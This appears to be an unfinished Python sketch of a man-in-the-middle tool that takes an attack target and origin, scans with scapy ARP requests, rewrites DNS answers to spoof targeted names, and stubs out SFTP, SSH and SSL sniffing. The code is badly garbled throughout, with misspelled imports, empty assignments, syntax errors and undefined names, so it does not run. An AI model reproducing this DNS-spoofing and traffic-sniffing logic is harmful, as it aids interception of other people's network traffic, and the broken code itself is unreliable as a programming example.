#

import collections, context, server, ssl , time, asyncio, pysftp, getpass, os, pathlib, logging, sys, atexit, netfilterqueqe, string, argsparse
from sqlalchemy import Column, Integer, String, MetaData, Table, Select
from pandas import DataFrame, MultiIndex, Series
from sqlalchemy.orm.decl_api import DeclarativeMeta 
from server import Base, Database
import contextlib 
import asyncio as sync 
import argparse, exprn, ip
import ip 

logging.basicConfig(
    level=logging.DEBUG,
    format='(%(Appname)s %(threadName)-10s) %(message)s',
    filename="sycllanetwork.log"
)
t=threading.Event()
register=atexit.register()
df=DataFrame
series=Series
mi= MultiIndex


def init_new_tables_(*args):
    with self.session as session:
        session.add_all([])
        session.commit()
    pass


def check_for_schemas():
    session=self.session
    engine=self.engine(url.set(drivername=drivename,database=name) echo)
    self.meta.create_all(engine)
    if session()


class LocalProduct(Userdatabase):
        super().__init__()
        pass 
     
    
class RemoteProduct(Userdatabase):
         super().__init__()
        pass


class ProductDatabase():
    def __init__(self, api):
        super(context.AbstractAsyncContextManager).__init__():
        pass

    add=
    commit= 
    search= 


class MultiplexDistribution:
    def __init__(self, product):
        self.kc_map= Series(data=product, columns=[]) 
        self.arp_table
        pass
    def prepare():
        pass 

    def __call__():
        pass 
class FrameworkData():
    def __init__(self):

        pass 

product = ProductDatabase()
index = FrameworkData

def user_input_target(self, **kwargs):
   pass 

def user_input_origin( *args):
   pass 

target_by_user = user_input_target
origin_by_user = user_input_origin
parser = argparse.ArgumentParser(
    description=' Enter the target and origin of the attack',
)
def scan_prompt_data(self) -> :
    with sys.argv as argv:
        print('set arguemnets: ', argv)
    if x is not None: 
        print(' continue  ')
    else :
        sys.stdout.write()

def whois(target:any ,origin:string):
        from scapy.all import ARP, Ether, srp
        config=
        function_arp=ARP 
        function_ether=Ether
        while True:
            try: 
                if target== type([]): 
                    for i in target: 
                        function_arp(op=ARP.who_has,pdst=i)
                        function_ether(dst=origin)
                else:
                    ARP(op=ARP.who_has, pdst=target)
                    Ether(dst=origin)
            except: 
                if origin is None:
                    fire= function_arp/function_broadcast
                    res=srp(fire, timeout=1, verbose=False)[0]
                    return res[0][1].hwsrc
   
def sniff_sftp():
    def sftp_getfiles(*args):
        username, password, hostname =args 
        cnopts=
        cnopts.hostkeys.load()
        with pysftp.Connection() as sftp: 
            pass
def sniff_sshp():
    pass 

def sniff_ssl():
    pass 

def spoof(packet):
    from scapy.all import scapy
    packet = scapy.IP(packet.get_payload())
    while packet.haslayer(scapy.DNSRR):
        qname = packet[scapy.DNSQR].qname 
        for i in target_by_user:
            if target_by_user in qname: 
                payload = scapy.DNSRR(rrname=qname, rdata=origin_by_user)
                packet[scapy.DNS].an = payload 
                packet[scapy.DNS].ancount = 1
                del packet[scapy.IP].len
                del packet[scapy.IP].chksum
                del packet[scapy.UDP].chksum
                del packet[scapy.UDP].chksum
                del packet[scapy.UDP].len 
            packet.set_payload(str())


scan_event= threading.Event()

scan_input_thread = threading.Thread(
    name=' scanning user input %()s'
    target = scan_prompt_data,
    args=(t,)
)

process_spoof_thread = threading.Thread(
    name=' packet processing %()s'
    target= process,
    args=(),
)

log = logging.getProcess()
process = ( process_spoof_thread  )

def main():
    volume= 
    interfaces= 
    environment_keys=
  parser.add_arguemnt('end', action=, default=False)
  parser.add_arguemnt('start', action=, default=True)
  parser.addd_arguement('get', action=, default=False)
  parser.add_arguemnt('--spoof',action=,default=False)
  parser.add_arguement('--connect',action=,default=False)
  while True:
    

if __name__ is __main__:
    main()
